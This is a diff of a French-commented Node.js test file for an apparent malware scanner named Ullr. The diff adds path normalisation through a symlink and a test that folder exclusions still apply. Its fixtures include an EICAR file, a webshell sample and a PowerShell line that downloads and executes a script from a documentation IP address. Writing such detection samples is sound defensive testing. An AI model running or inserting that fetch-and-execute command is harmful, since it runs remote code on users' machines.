@@ -3,7 +3,7 @@
 // Aucun vrai malware n'est téléchargé ni créé.
 import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import test from 'node:test';
@@ -407,7 +407,10 @@ test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en qu
     writeFileSync(join(d, 'note.txt'), 'Bonjour'); writeFileSync(join(d, 'eicar.com'), EICAR); writeFileSync(join(d, 'sous', 'shell.php'), WEBSHELL);
     writeFileSync(join(d, 'maj.ps1'), 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'); writeFileSync(join(d, 'exclu', 'autre.php'), WEBSHELL);
     writeFileSync(join(d, 'vide.txt'), ''); symlinkSync(d, join(d, 'boucle'));
-    assert.deepEqual([...walk(d)].map((f) => f.slice(d.length + 1)).sort(), ['eicar.com', 'exclu/autre.php', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'les liens symboliques ne sont pas suivis (pas de boucle)');
+    assert.deepEqual([...walk(d)].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'exclu/autre.php', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'les liens symboliques ne sont pas suivis (pas de boucle)');
+    // Un dossier donné par un lien (ou un dossier temporaire lié, comme sur macOS) : les exclusions tiennent quand même.
+    const lien = join(w.home, 'lien-inbox'); symlinkSync(d, lien);
+    assert.deepEqual([...walk(lien, [join(lien, 'exclu')])].map((f) => f.slice(realpathSync(d).length + 1).replace(/\\/g, '/')).sort(), ['eicar.com', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'exclusion donnée par le chemin du lien');
     const r = await act(w, 'analyser', { dossier: d, exclusions: join(d, 'exclu') });
     assert.equal(r.ok, true); assert.match(r.text, /5 fichiers analysés[\s\S]*3 détection\(s\)/);
     assert.match(r.text, /\[critique\] PHP\.Webshell \(eval encodé\) — .*sous\/shell\.php \(en quarantaine\)/);
